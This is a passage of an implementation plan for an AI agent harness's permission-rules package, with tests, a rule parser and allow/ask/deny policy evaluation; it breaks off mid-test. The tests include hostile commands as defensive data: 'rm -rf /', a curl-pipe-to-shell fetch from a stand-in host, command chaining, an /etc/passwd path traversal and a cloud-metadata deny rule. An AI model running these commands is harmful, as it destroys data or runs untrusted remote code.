  - `policy.ts`: `interface CompiledRule`, `interface CompiledPolicy { readonly tables: PolicyTables; readonly scopes: ReadonlyMap<string, { readonly scope: ToolScope; readonly spec: CapabilitySpec }>; readonly rules: readonly CompiledRule[] }`, `compilePolicy(tables: PolicyTables, rules: readonly RuleInput[]): { policy: CompiledPolicy; problems: string[] }`, `evaluate(policy: CompiledPolicy, call: CallFacts, home?: string): Verdict`, `type DownstreamKind = 'allow' | 'deny' | 'cancel' | 'ask'`, `type CombineOutcome = 'air-deny' | 'air-ask' | 'rule-allow-over-ask' | 'downstream'`, `combine(verdict: Verdict, downstream: DownstreamKind, options: { readonly ruleAllowSatisfiesAsk: boolean }): CombineOutcome`.

- [ ] **Step 1: Write the failing rule-syntax tests**

`air/packages/permission-rules/tests/rule-syntax.spec.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { formatRule, parseRuleSpec } from '../src/rule-syntax.ts'
import { defaultToolScopes } from '../src/taxonomy.ts'

const tools = defaultToolScopes()

describe('parseRuleSpec', () => {
  it('translates Claude Code tool names and binds the pattern to the first scope argument', () => {
    expect(parseRuleSpec('Bash(git status*)', tools)).toEqual({ tool: 'bash', match: { command: 'git status*' } })
    expect(parseRuleSpec('Read(./src/**)', tools)).toEqual({ tool: 'read', match: { file_path: './src/**' } })
    expect(parseRuleSpec('MultiEdit(docs/**)', tools)).toEqual({ tool: 'edit', match: { file_path: 'docs/**' } })
    expect(parseRuleSpec('WebFetch(domain:example.com)', tools)).toEqual({ tool: 'web_fetch', match: { url: 'domain:example.com' } })
  })

  it('turns the Claude Code prefix form into a wildcard', () => {
    expect(parseRuleSpec('Bash(npm run test:*)', tools)).toEqual({ tool: 'bash', match: { command: 'npm run test*' } })
  })

  it('accepts a bare tool, a dsh name, an MCP name, and surrounding whitespace', () => {
    expect(parseRuleSpec('  Bash ', tools)).toEqual({ tool: 'bash' })
    expect(parseRuleSpec('web_search', tools)).toEqual({ tool: 'web_search' })
    expect(parseRuleSpec('todo_write', tools)).toEqual({ tool: 'todo_write' })
    expect(parseRuleSpec('mcp__github__create_issue', tools)).toEqual({ tool: 'mcp__github__create_issue' })
  })

  it('rejects malformed specs', () => {
    expect(() => parseRuleSpec('', tools)).toThrow(/Tool or Tool\(pattern\) form/)
    expect(() => parseRuleSpec('Bash(git status', tools)).toThrow(/Tool or Tool\(pattern\) form/)
    expect(() => parseRuleSpec('Ba sh(x)', tools)).toThrow(/Tool or Tool\(pattern\) form/)
  })

  it('rejects unknown tool names', () => {
    expect(() => parseRuleSpec('NotebookEdit(x)', tools)).toThrow(/unknown tool "NotebookEdit"/)
  })

  it('rejects an empty pattern', () => {
    expect(() => parseRuleSpec('Bash()', tools)).toThrow(/empty pattern/)
    expect(() => parseRuleSpec('Bash(:*)', tools)).not.toThrow()
  })

  it('rejects a pattern for a tool without a scope entry', () => {
    expect(() => parseRuleSpec('mcp__github__create_issue(x)', tools)).toThrow(/has no capability scope entry/)
  })
})

describe('formatRule', () => {
  it('renders tool rules, capability rules, and match entries', () => {
    expect(formatRule({ id: 'r1', decision: 'allow', tool: 'bash', match: { command: 'git status*' } }))
      .toBe('allow bash(command=git status*)')
    expect(formatRule({ id: 'r2', decision: 'deny', capability: 'net.fetch', match: { url: 'http://169.254.*' } }))
      .toBe('deny capability:net.fetch(url=http://169.254.*)')
    expect(formatRule({ id: 'r3', decision: 'ask', tool: 'write' })).toBe('ask write')
    expect(formatRule({ id: 'r4', decision: 'allow', tool: 'x', match: { a: '1', b: '2' } })).toBe('allow x(a=1, b=2)')
  })
})
```

- [ ] **Step 2: Write the failing policy tests**

`air/packages/permission-rules/tests/policy.spec.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { combine, compilePolicy, evaluate, type CompiledPolicy } from '../src/policy.ts'
import { defaultCapabilities, defaultToolScopes } from '../src/taxonomy.ts'
import type { CallFacts, PolicyTables, RuleInput, Verdict } from '../src/types.ts'

const tables: PolicyTables = {
  capabilities: defaultCapabilities(),
  tools: defaultToolScopes(),
  unscopedDefault: 'allow',
  unscopedMcpDefault: 'ask',
}

function policyOf(rules: readonly RuleInput[], overrides: Partial<PolicyTables> = {}): CompiledPolicy {
  const compiled = compilePolicy({ ...tables, ...overrides }, rules)
  expect(compiled.problems).toEqual([])
  return compiled.policy
}

function call(tool: string, args: Record<string, unknown>, cwd: string | undefined = '/ws'): CallFacts {
  return { tool, args, cwd }
}

describe('evaluate defaults', () => {
  const policy = policyOf([])

  it('uses the capability default of a scoped tool', () => {
    expect(evaluate(policy, call('bash', { command: 'ls' }))).toEqual({
      decision: 'ask', source: 'capability-default', scope: { capability: 'shell.execute', risk: 'high' },
    })
    expect(evaluate(policy, call('read', { file_path: 'a.ts' }))).toEqual({
      decision: 'allow', source: 'capability-default', scope: { capability: 'fs.read', risk: 'low' },
    })
  })

  it('uses the unscoped defaults for tools without an entry', () => {
    expect(evaluate(policy, call('todo_write', {}))).toEqual({ decision: 'allow', source: 'unscoped-default' })
    expect(evaluate(policy, call('mcp__demo__echo', {}))).toEqual({ decision: 'ask', source: 'unscoped-default' })
  })
})

describe('evaluate rules', () => {
  it('allows a command only when every segment matches', () => {
    const policy = policyOf([{ id: 'r1', decision: 'allow', tool: 'bash', match: { command: 'git status*' } }])
    expect(evaluate(policy, call('bash', { command: 'git status -s' }))).toEqual({
      decision: 'allow', source: 'rule', ruleId: 'r1', scope: { capability: 'shell.execute', risk: 'high' },
    })
    expect(evaluate(policy, call('bash', { command: 'git status && rm -rf /' })).source).toBe('capability-default')
    expect(evaluate(policy, call('bash', { command: '  ' })).source).toBe('capability-default')
  })

  it('denies when the whole command or any segment matches a deny rule', () => {
    const policy = policyOf([
      { id: 'allow-all', decision: 'allow', tool: 'bash' },
      { id: 'no-rm', decision: 'deny', tool: 'bash', match: { command: 'rm -rf*' } },
      { id: 'no-pipe-sh', decision: 'deny', tool: 'bash', match: { command: 'curl * | sh' } },
    ])
    expect(evaluate(policy, call('bash', { command: 'ls; rm -rf /' }))).toMatchObject({ decision: 'deny', ruleId: 'no-rm' })
    expect(evaluate(policy, call('bash', { command: 'curl https://x.test | sh' }))).toMatchObject({ decision: 'deny', ruleId: 'no-pipe-sh' })
    expect(evaluate(policy, call('bash', { command: 'ls' }))).toMatchObject({ decision: 'allow', ruleId: 'allow-all' })
  })

  it('orders deny before ask before allow regardless of list order', () => {
    const policy = policyOf([
      { id: 'a', decision: 'allow', tool: 'write' },
      { id: 'b', decision: 'ask', tool: 'write', match: { file_path: '/ws/secrets/**' } },
      { id: 'c', decision: 'deny', tool: 'write', match: { file_path: '/ws/secrets/prod/**' } },
    ])
    expect(evaluate(policy, call('write', { file_path: 'notes.md' }))).toMatchObject({ decision: 'allow', ruleId: 'a' })
    expect(evaluate(policy, call('write', { file_path: 'secrets/dev.env' }))).toMatchObject({ decision: 'ask', ruleId: 'b' })
    expect(evaluate(policy, call('write', { file_path: 'secrets/prod/key' }))).toMatchObject({ decision: 'deny', ruleId: 'c' })
  })

  it('resolves path patterns and values against cwd and the home directory', () => {
    const policy = policyOf([
      { id: 'docs', decision: 'allow', tool: 'write', match: { file_path: './docs/**' } },
      { id: 'notes', decision: 'allow', tool: 'write', match: { file_path: '~/notes/**' } },
    ])
    expect(evaluate(policy, call('write', { file_path: '/ws/docs/a.md' }), '/home/u').ruleId).toBe('docs')
    expect(evaluate(policy, call('write', { file_path: 'docs/../../etc/passwd' }), '/home/u').source).toBe('capability-default')
    expect(evaluate(policy, call('write', { file_path: '/home/u/notes/a.md' }), '/home/u').ruleId).toBe('notes')
    expect(evaluate(policy, call('write', { file_path: 'docs/a.md' }, undefined), '/home/u').source).toBe('capability-default')
  })

  it('applies capability rules to every tool with that capability', () => {
    const policy = policyOf([{ id: 'meta', decision: 'deny', capability: 'net.fetch', match: { url: 'http://169.254.*' } }])
    expect(evaluate(policy, call('web_fetch', { url: 'http://169.254.169.254/latest' }))).toMatchObject({ decision: 'deny', ruleId: 'meta' })
    expect(evaluate(policy, call('web_fetch', { url: 'https://example.com' })).source).toBe('capability-default')
    expect(evaluate(policy, call('bash', { command: 'ls', url: 'http://169.254.1.1' })).source).toBe('capability-default')
  })

  it('matches arbitrary string arguments of tools without a scope entry', () => {
    const policy = policyOf([{ id: 'mine', decision: 'allow', tool: 'mcp__github__create_issue', match: { repo: 'me/*' } }])
    expect(evaluate(policy, call('mcp__github__create_issue', { repo: 'me/site' }))).toEqual({ decision: 'allow', source: 'rule', ruleId: 'mine' })
    expect(evaluate(policy, call('mcp__github__create_issue', { repo: 'them/site' })).source).toBe('unscoped-default')
  })

  it('does not match a missing or non-string argument', () => {
    const policy = policyOf([{ id: 'r', decision: 'allow', tool: 'bash', match: { command: '*' } }])
    expect(evaluate(policy, call('bash', {})).source).toBe('capability-default')
    expect(evaluate(policy, call('bash', { command: 42 })).source).toBe('capability-default')
  })
})

describe('compilePolicy problems', () => {
  it('reports table errors', () => {
    const compiled = compilePolicy({
      ...tables,
      tools: {
        a: { capability: 'missing', scopeArgKeys: ['x'], pathKeys: [], commandKeys: [] },
        b: { capability: 'fs.read', scopeArgKeys: [], pathKeys: [], commandKeys: [] },
        c: { capability: 'fs.read', scopeArgKeys: ['x'], pathKeys: ['y'], commandKeys: ['z'] },
      },
    }, [])
    expect(compiled.problems).toEqual([
      'tools.a: unknown capability "missing"',
      'tools.b: scopeArgKeys must name at least one argument',
      'tools.c: "y" must also be listed in scopeArgKeys',
      'tools.c: "z" must also be listed in scopeArgKeys',
    ])
  })

  it('reports rule errors', () => {
    const compiled = compilePolicy(tables, [
      { id: '', decision: 'allow', tool: 'bash' },
      { id: 'dup', decision: 'allow', tool: 'bash' },
      { id: 'dup', decision: 'deny', tool: 'bash' },
      { id: 'both', decision: 'allow', tool: 'bash', capability: 'fs.read' },
      { id: 'neither', decision: 'allow' },
      { id: 'cap', decision: 'deny', capability: 'nope' },
      { id: 'empty', decision: 'allow', tool: 'bash', match: { command: '' } },
      { id: 'key', decision: 'deny', capability: 'fs.read', match: { url: 'x' } },
    ])
    expect(compiled.problems).toEqual([
      'a rule has an empty id',
      'rule "dup": duplicate id',
      'rule "both": must name exactly one of tool or capability',
      'rule "neither": must name exactly one of tool or capability',
      'rule "cap": unknown capability "nope"',
      'rule "empty": empty pattern for argument "command"',
      'rule "key": argument "url" is not a scope argument of any tool with capability "fs.read"',
    ])
  })
})

describe('combine', () => {
  const rule = (decision: Verdict['decision']): Verdict => ({ decision, source: 'rule' })
  const fallback = (decision: Verdict['decision']): Verdict => ({ decision, source: 'capability-default' })
  const on = { ruleAllowSatisfiesAsk: true }

  it('lets an AIR deny win over every downstream decision', () => {
    for (const downstream of ['allow', 'deny', 'cancel', 'ask'] as const) {
      expect(combine(rule('deny'), downstream, on)).toBe('air-deny')
    }
  })

  it('keeps a downstream deny or cancel', () => {
    expect(combine(rule('allow'), 'deny', on)).toBe('downstream')
    expect(combine(rule('ask'), 'cancel', on)).toBe('downstream')
  })

  it('asks when AIR asks and downstream allows or asks', () => {
    expect(combine(fallback('ask'), 'allow', on)).toBe('air-ask')
    expect(combine(rule('ask'), 'ask', on)).toBe('air-ask')
  })

  it('lets only an explicit allow rule satisfy a downstream ask', () => {
    expect(combine(rule('allow'), 'ask', on)).toBe('rule-allow-over-ask')
    expect(combine(fallback('allow'), 'ask', on)).toBe('downstream')
    expect(combine(rule('allow'), 'ask', { ruleAllowSatisfiesAsk: false })).toBe('downstream')
  })

  it('returns downstream when both allow', () => {
    expect(combine(rule('allow'), 'allow', on)).toBe('downstream')
    expect(combine(fallback('allow'), 'allow', on)).toBe('downstream')
  })
})
```

- [ ] **Step 3: Run the tests to verify they fail**

Run: `pnpm -C /home/hxman/AIR-harness/air/packages/permission-rules test`
Expected: FAIL; `../src/rule-syntax.ts` and `../src/policy.ts` cannot be resolved; `match.spec.ts` still passes.

- [ ] **Step 4: Write the rule syntax module**

`air/packages/permission-rules/src/rule-syntax.ts`:

```ts
/** Parser for the `Tool` / `Tool(pattern)` rule syntax used by `/allow` and `/deny`, and the rule formatter used in listings. */
import { toDshToolName } from '@air/dsh-convention-core'
import type { RuleInput, ToolScope } from './types.ts'

const TOOL_NAME = /^[A-Za-z_][\w-]*$/
const DSH_NAME = /^[a-z][a-z0-9_]*$/
const CLAUDE_PREFIX_SUFFIX = ':*'

/** The tool and optional argument match of one parsed rule spec. */
export interface ParsedRuleSpec {
  /** dsh tool name. */
  readonly tool: string
  /** One entry binding the pattern to the tool's first scope argument; absent for a bare tool. */
  readonly match?: Record<string, string>
}

/**
 * Parse one `Tool` or `Tool(pattern)` spec.
 * @param spec - text typed by the user, for example `Bash(git status*)`.
 * @param tools - current tool scope table; supplies the argument a pattern binds to.
 * @returns the dsh tool name and the match entry.
 * @throws Error with a user-facing message for a malformed spec, an unknown tool name, an empty pattern, or a pattern on a tool without a scope entry.
 */
export function parseRuleSpec(spec: string, tools: Readonly<Record<string, ToolScope>>): ParsedRuleSpec {
  const text = spec.trim()
  const open = text.indexOf('(')
  const rawName = open < 0 ? text : text.slice(0, open)
  if (!TOOL_NAME.test(rawName) || (open >= 0 && !text.endsWith(')'))) {
    throw new Error(`rule "${spec}" is not in Tool or Tool(pattern) form`)
  }
  const tool = toDshToolName(rawName) ?? (DSH_NAME.test(rawName) ? rawName : undefined)
  if (tool === undefined) throw new Error(`rule "${spec}" names an unknown tool "${rawName}"`)
  if (open < 0) return { tool }
  const inner = text.slice(open + 1, -1).trim()
  if (inner === '') throw new Error(`rule "${spec}" has an empty pattern; write ${rawName} to match every call`)
  const pattern = inner.endsWith(CLAUDE_PREFIX_SUFFIX) ? `${inner.slice(0, -CLAUDE_PREFIX_SUFFIX.length)}*` : inner
  const key = Object.hasOwn(tools, tool) ? tools[tool]?.scopeArgKeys[0] : undefined
  if (key === undefined) {
    throw new Error(`rule "${spec}" has a pattern, but tool "${tool}" has no capability scope entry that names the argument to match`)
  }
  return { tool, match: { [key]: pattern } }
}

/**
 * Render one rule for listings and command replies.
 * @param rule - rule from Config or the rules file.
 * @returns `<decision> <tool | capability:id>[(arg=pattern, ...)]`.
 */
export function formatRule(rule: RuleInput): string {
  const subject = rule.tool ?? `capability:${String(rule.capability)}`
  const entries = Object.entries(rule.match ?? {}).map(([key, pattern]) => `${key}=${pattern}`)
  return `${rule.decision} ${subject}${entries.length === 0 ? '' : `(${entries.join(', ')})`}`
}
```

- [ ] **Step 5: Write the policy module**

`air/packages/permission-rules/src/policy.ts`:

```ts
/** Policy compilation, evaluation of one call, and combination with the downstream pre-execute decision. */
import { matchPath, matchText, splitCommand } from './match.ts'
import {
  RuleId,
  type CallFacts,
  type CapabilitySpec,
  type Decision,
  type PolicyTables,
  type RuleInput,
  type ToolScope,
  type Verdict,
} from './types.ts'

/** One validated rule. */
export interface CompiledRule {
  readonly id: RuleId
  readonly decision: Decision
  readonly tool: string | undefined
  readonly capability: string | undefined
  readonly match: readonly (readonly [key: string, pattern: string])[]
}

/** A validated policy. `scopes` holds only the `tools` entries whose capability exists. */
export interface CompiledPolicy {
  readonly tables: PolicyTables
  readonly scopes: ReadonlyMap<string, { readonly scope: ToolScope; readonly spec: CapabilitySpec }>
  readonly rules: readonly CompiledRule[]
}

/** Kind of the decision returned by the rest of the `tools/pre-execute` chain. */
export type DownstreamKind = 'allow' | 'deny' | 'cancel' | 'ask'

/** What the policy listener does after combining its verdict with the downstream decision. */
export type CombineOutcome = 'air-deny' | 'air-ask' | 'rule-allow-over-ask' | 'downstream'

const DECISION_ORDER: readonly Decision[] = ['deny', 'ask', 'allow']
const MCP_PREFIX = 'mcp__'

function capabilityArgKeys(tables: PolicyTables, capability: string): Set<string> {
  const keys = new Set<string>()
  for (const scope of Object.values(tables.tools)) {
    if (scope.capability === capability) for (const key of scope.scopeArgKeys) keys.add(key)
  }
  return keys
}

function ruleProblems(rule: RuleInput, tables: PolicyTables, seen: Set<string>): string[] {
  const label = `rule "${rule.id}"`
  const problems: string[] = []
  if (rule.id === '') problems.push('a rule has an empty id')
  else if (seen.has(rule.id)) problems.push(`${label}: duplicate id`)
  seen.add(rule.id)
  if ((rule.tool === undefined) === (rule.capability === undefined)) {
    problems.push(`${label}: must name exactly one of tool or capability`)
    return problems
  }
  if (rule.capability !== undefined && !Object.hasOwn(tables.capabilities, rule.capability)) {
    problems.push(`${label}: unknown capability "${rule.capability}"`)
    return problems
  }
  for (const [key, pattern] of Object.entries(rule.match ?? {})) {
    if (pattern === '') problems.push(`${label}: empty pattern for argument "${key}"`)
    if (rule.capability !== undefined && !capabilityArgKeys(tables, rule.capability).has(key)) {
      problems.push(`${label}: argument "${key}" is not a scope argument of any tool with capability "${rule.capability}"`)
    }
  }
  return problems
}

/**
 * Validate the tables and rules and build the policy.
 * @param tables - capability table, tool scopes, and unscoped defaults.
 * @param rules - rules in precedence order within one decision.
 * @returns the policy and every problem found. A caller must not use the policy when `problems` is non-empty.
 */
export function compilePolicy(tables: PolicyTables, rules: readonly RuleInput[]): { policy: CompiledPolicy; problems: string[] } {
  const problems: string[] = []
  const scopes = new Map<string, { readonly scope: ToolScope; readonly spec: CapabilitySpec }>()
  for (const [tool, scope] of Object.entries(tables.tools)) {
    const spec = Object.hasOwn(tables.capabilities, scope.capability) ? tables.capabilities[scope.capability] : undefined
    if (spec === undefined) {
      problems.push(`tools.${tool}: unknown capability "${scope.capability}"`)
      continue
    }
    if (scope.scopeArgKeys.length === 0) problems.push(`tools.${tool}: scopeArgKeys must name at least one argument`)
    for (const key of [...scope.pathKeys, ...scope.commandKeys]) {
      if (!scope.scopeArgKeys.includes(key)) problems.push(`tools.${tool}: "${key}" must also be listed in scopeArgKeys`)
    }
    scopes.set(tool, { scope, spec })
  }
  const seen = new Set<string>()
  const compiled: CompiledRule[] = []
  for (const rule of rules) {
    problems.push(...ruleProblems(rule, tables, seen))
    compiled.push({
      id: RuleId(rule.id),
      decision: rule.decision,
      tool: rule.tool,
      capability: rule.capability,
      match: Object.entries(rule.match ?? {}),
    })
  }
  return { policy: { tables, scopes, rules: compiled }, problems }
}

function commandMatches(decision: Decision, pattern: string, command: string): boolean {
  const segments = splitCommand(command)
  if (decision === 'allow') return segments.length > 0 && segments.every(segment => matchText(pattern, segment))
  return matchText(pattern, command) || segments.some(segment => matchText(pattern, segment))
}

function ruleMatches(rule: CompiledRule, call: CallFacts, scope: ToolScope | undefined, home: string | undefined): boolean {
  return rule.match.every(([key, pattern]) => {
    const value = call.args[key]
    if (typeof value !== 'string') return false
    if (scope?.pathKeys.includes(key) === true) return matchPath(pattern, value, call.cwd, home)
    if (scope?.commandKeys.includes(key) === true) return commandMatches(rule.decision, pattern, value)
    return matchText(pattern, value)
  })
}

/**
 * Decide one call. Deny rules are checked first, then ask rules, then allow
 * rules; within one decision the first matching rule in list order wins. With
 * no matching rule the capability default applies, or the unscoped default for
 * a tool without a scope entry.
 * @param policy - a policy compiled without problems.
 * @param call - tool name, parsed arguments, and session working directory.
 * @param home - home directory override for tests.
 * @returns the decision, its source, the matching rule id, and the tool's capability scope.
 */
export function evaluate(policy: CompiledPolicy, call: CallFacts, home?: string): Verdict {
  const entry = policy.scopes.get(call.tool)
  const scope = entry === undefined ? {} : { scope: { capability: entry.scope.capability, risk: entry.spec.risk } }
  for (const decision of DECISION_ORDER) {
    for (const rule of policy.rules) {
      if (rule.decision !== decision) continue
      if (rule.tool !== call.tool && (entry === undefined || rule.capability !== entry.scope.capability)) continue
      if (ruleMatches(rule, call, entry?.scope, home)) return { decision, source: 'rule', ruleId: rule.id, ...scope }
    }
  }
  if (entry !== undefined) return { decision: entry.spec.default, source: 'capability-default', ...scope }
  const { unscopedDefault, unscopedMcpDefault } = policy.tables
  return { decision: call.tool.startsWith(MCP_PREFIX) ? unscopedMcpDefault : unscopedDefault, source: 'unscoped-default' }
}

/**
 * Combine the AIR verdict with the downstream decision. Order: deny, cancel,
 * ask, allow; an explicit allow rule may replace a downstream ask.
 * @param verdict - the AIR verdict for the call.
 * @param downstream - kind of the decision `next()` returned.
 * @param options - `ruleAllowSatisfiesAsk` enables the allow-over-ask exception.
 * @returns which decision the listener returns.
 */
export function combine(
  verdict: Verdict,
  downstream: DownstreamKind,
  options: { readonly ruleAllowSatisfiesAsk: boolean },
): CombineOutcome {
  if (verdict.decision === 'deny') return 'air-deny'
  if (downstream === 'deny' || downstream === 'cancel') return 'downstream'
  if (verdict.decision === 'ask') return 'air-ask'
  if (downstream === 'ask' && verdict.source === 'rule' && options.ruleAllowSatisfiesAsk) return 'rule-allow-over-ask'
  return 'downstream'
}
```

- [ ] **Step 6: Run the tests to verify they pass**

Run: `pnpm -C /home/hxman/AIR-harness/air/packages/permission-rules test`
Expected: `Test Files 3 passed (3)`.

- [ ] **Step 7: Typecheck and commit**

Run: `pnpm -C /home/hxman/AIR-harness/air/packages/permission-rules typecheck`
Expected: exit 0.

```bash
cd /home/hxman/AIR-harness
git add air/packages/permission-rules
git commit -m "feat(air): add permission rule syntax and policy evaluation"
```

---

### Task 3: Rules file, policy source, and audit log

**Files:**
- Create: `air/packages/permission-rules/src/rule-store.ts`
- Create: `air/packages/permission-rules/src/policy-source.ts`
- Create: `air/packages/permission-rules/src/audit.ts`
- Test: `air/packages/permission-rules/tests/rule-store.spec.ts`
- Test: `air/packages/permission-rules/tests/policy-source.spec.ts`
- Test: `air/packages/permission-rules/tests/audit.spec.ts`

**Interfaces:**
- Consumes from Tasks 1-2: `RuleInput`, `Decision`, `Risk`, `PolicyTables`, `compilePolicy`, `CompiledPolicy`. From `@air/dsh-convention-core` (plan 01 Task 2): `isRecord(value: unknown): value is Record<string, unknown>`. From upstream `@deepseek-ai/dsh-atomic-write`: `writeFileAtomic(filename: string, content: string, options: { mode: number; dirMode?: number }): Promise<void>`, `withFileLock<T>(filename: string, operation: () => Promise<T>): Promise<T>` (the parent directory must exist).
- Produces:
  - `rule-store.ts`: `parseRulesFile(text: string, path: string): RuleInput[]` (throws), `class RuleStore { constructor(path: string); readonly path: string; list(): readonly RuleInput[]; refresh(): Promise<boolean>; update(change: (rules: readonly RuleInput[]) => readonly RuleInput[]): Promise<void> }`. File format: `{ "version": 1, "rules": RuleInput[] }`, mode `0600`, directory mode `0700`.
  - `policy-source.ts`: `class PolicySource { constructor(tables: PolicyTables, configRules: readonly RuleInput[], store: RuleStore, report: (message: string) => void); readonly tables: PolicyTables; load(): Promise<void>; current(): Promise<CompiledPolicy>; rules(): readonly RuleInput[]; add(rule: RuleInput): Promise<void>; remove(id: string): Promise<boolean> }`.
  - `audit.ts`: `interface AuditRecord`, `class AuditLog { constructor(path: string); append(record: AuditRecord): Promise<void> }`, `argsDigest(args: Readonly<Record<string, unknown>>): string`.

- [ ] **Step 1: Write the failing rule-store tests**

`air/packages/permission-rules/tests/rule-store.spec.ts`:

```ts
import { mkdtemp, readFile, rm, stat, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { parseRulesFile, RuleStore } from '../src/rule-store.ts'

const created: string[] = []

async function tempDir(): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'air-rule-store-'))
  created.push(dir)
  return dir
}

afterEach(async () => {
  for (const dir of created.splice(0)) await rm(dir, { recursive: true, force: true })
})

const VALID = JSON.stringify({
  version: 1,
  rules: [
    { id: 'r1', decision: 'allow', tool: 'bash', match: { command: 'git status*' } },
    { id: 'r2', decision: 'deny', capability: 'net.fetch' },
  ],
})

describe('parseRulesFile', () => {
  it('returns the rules of a valid file', () => {
    expect(parseRulesFile(VALID, 'p.json')).toEqual([
      { id: 'r1', decision: 'allow', tool: 'bash', match: { command: 'git status*' } },
      { id: 'r2', decision: 'deny', capability: 'net.fetch' },
    ])
  })

  it('rejects invalid JSON and a wrong document', () => {
    expect(() => parseRulesFile('{', 'p.json')).toThrow(/^p\.json: not valid JSON/)
    expect(() => parseRulesFile('[]', 'p.json')).toThrow('p.json: expected { "version": 1, "rules": [...] }')
    expect(() => parseRulesFile('{"version":2,"rules":[]}', 'p.json')).toThrow(/expected \{ "version": 1/)
    expect(() => parseRulesFile('{"version":1,"rules":{}}', 'p.json')).toThrow(/expected \{ "version": 1/)
  })

  it('rejects invalid rule entries with their index', () => {
    const file = (rule: unknown): string => JSON.stringify({ version: 1, rules: [{ id: 'ok', decision: 'ask', tool: 'x' }, rule] })
    expect(() => parseRulesFile(file('x'), 'p.json')).toThrow('p.json: rules[1] needs a string id and a decision of allow, ask, or deny')
    expect(() => parseRulesFile(file({ id: 1, decision: 'allow' }), 'p.json')).toThrow(/rules\[1\] needs a string id/)
    expect(() => parseRulesFile(file({ id: 'a', decision: 'maybe' }), 'p.json')).toThrow(/rules\[1\] needs a string id/)
    expect(() => parseRulesFile(file({ id: 'a', decision: 'allow', tool: 1 }), 'p.json')).toThrow('p.json: rules[1].tool must be a string')
    expect(() => parseRulesFile(file({ id: 'a', decision: 'allow', capability: [] }), 'p.json')).toThrow('p.json: rules[1].capability must be a string')
    expect(() => parseRulesFile(file({ id: 'a', decision: 'allow', tool: 'x', match: [] }), 'p.json')).toThrow('p.json: rules[1].match must map argument names to string patterns')
    expect(() => parseRulesFile(file({ id: 'a', decision: 'allow', tool: 'x', match: { k: 1 } }), 'p.json')).toThrow(/rules\[1\]\.match must map/)
  })
})

describe('RuleStore', () => {
  it('treats a missing file as an empty rule list', async () => {
    const store = new RuleStore(join(await tempDir(), 'permissions.json'))
    expect(await store.refresh()).toBe(true)
    expect(store.list()).toEqual([])
    expect(await store.refresh()).toBe(false)
  })

  it('reads the file and re-reads it after a hand edit', async () => {
    const path = join(await tempDir(), 'permissions.json')
    await writeFile(path, VALID)
    const store = new RuleStore(path)
    expect(await store.refresh()).toBe(true)
    expect(store.list().map(rule => rule.id)).toEqual(['r1', 'r2'])
    expect(await store.refresh()).toBe(false)
    await writeFile(path, JSON.stringify({ version: 1, rules: [] }))
    expect(await store.refresh()).toBe(true)
    expect(store.list()).toEqual([])
  })

  it('reports an invalid file once per file version and keeps the previous rules', async () => {
    const path = join(await tempDir(), 'permissions.json')
    await writeFile(path, VALID)
    const store = new RuleStore(path)
    await store.refresh()
    await writeFile(path, '{ broken')
    await expect(store.refresh()).rejects.toThrow(/not valid JSON/)
    expect(await store.refresh()).toBe(false)
    expect(store.list().map(rule => rule.id)).toEqual(['r1', 'r2'])
  })

  it('rethrows a stat failure other than a missing file', async () => {
    const dir = await tempDir()
    await writeFile(join(dir, 'plain'), 'x')
    const store = new RuleStore(join(dir, 'plain', 'permissions.json'))
    await expect(store.refresh()).rejects.toThrow(/ENOTDIR/)
  })

  it('creates the directory and writes the file with owner-only permissions', async () => {
    const path = join(await tempDir(), 'air', 'permissions.json')
    const store = new RuleStore(path)
    await store.update(rules => [...rules, { id: 'r1', decision: 'allow', tool: 'bash' }])
    expect(JSON.parse(await readFile(path, 'utf8'))).toEqual({ version: 1, rules: [{ id: 'r1', decision: 'allow', tool: 'bash' }] })
    expect((await stat(path)).mode & 0o777).toBe(0o600)
    expect(store.list()).toEqual([{ id: 'r1', decision: 'allow', tool: 'bash' }])
    expect(await store.refresh()).toBe(false)
  })

  it('applies an update to the file as it is on disk, not to a stale list', async () => {
    const path = join(await tempDir(), 'permissions.json')
    const store = new RuleStore(path)
    await store.refresh()
    await writeFile(path, VALID)
    await store.update(rules => [...rules, { id: 'r3', decision: 'ask', tool: 'write' }])
    expect(store.list().map(rule => rule.id)).toEqual(['r1', 'r2', 'r3'])
  })

  it('refuses to overwrite an invalid file', async () => {
    const path = join(await tempDir(), 'permissions.json')
    await writeFile(path, '{ broken')
    const store = new RuleStore(path)
    await expect(store.update(rules => rules)).rejects.toThrow(/not valid JSON/)
    expect(await readFile(path, 'utf8')).toBe('{ broken')
  })

  it('writes nothing when the change callback throws', async () => {
    const path = join(await tempDir(), 'permissions.json')
    const store = new RuleStore(path)
    await expect(store.update(() => { throw new Error('rejected') })).rejects.toThrow('rejected')
    await expect(stat(path)).rejects.toThrow(/ENOENT/)
  })
})
```

- [ ] **Step 2: Write the failing policy-source tests**

`air/packages/permission-rules/tests/policy-source.spec.ts`:

```ts
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { evaluate } from '../src/policy.ts'
import { PolicySource } from '../src/policy-source.ts'
import { RuleStore } from '../src/rule-store.ts'
import { defaultCapabilities, defaultToolScopes } from '../src/taxonomy.ts'
import type { PolicyTables, RuleInput } from '../src/types.ts'

const tables: PolicyTables = {
  capabilities: defaultCapabilities(),
  tools: defaultToolScopes(),
  unscopedDefault: 'allow',
  unscopedMcpDefault: 'ask',
}
const created: string[] = []

async function setup(configRules: readonly RuleInput[] = [], fileText?: string): Promise<{ source: PolicySource; path: string; reports: string[] }> {
  const dir = await mkdtemp(join(tmpdir(), 'air-policy-source-'))
  created.push(dir)
  const path = join(dir, 'permissions.json')
  if (fileText !== undefined) await writeFile(path, fileText)
  const reports: string[] = []
  const source = new PolicySource(tables, configRules, new RuleStore(path), (message) => { reports.push(message) })
  return { source, path, reports }
}

function fileOf(rules: readonly RuleInput[]): string {
  return JSON.stringify({ version: 1, rules })
}

async function decisionFor(source: PolicySource, command: string): Promise<string> {
  return evaluate(await source.current(), { tool: 'bash', args: { command }, cwd: '/ws' }).decision
}

afterEach(async () => {
  for (const dir of created.splice(0)) await rm(dir, { recursive: true, force: true })
})

describe('PolicySource.load', () => {
  it('merges Config rules and file rules, Config first', async () => {
    const { source } = await setup(
      [{ id: 'c1', decision: 'deny', tool: 'bash', match: { command: 'rm *' } }],
      fileOf([{ id: 'f1', decision: 'allow', tool: 'bash', match: { command: 'ls*' } }]),
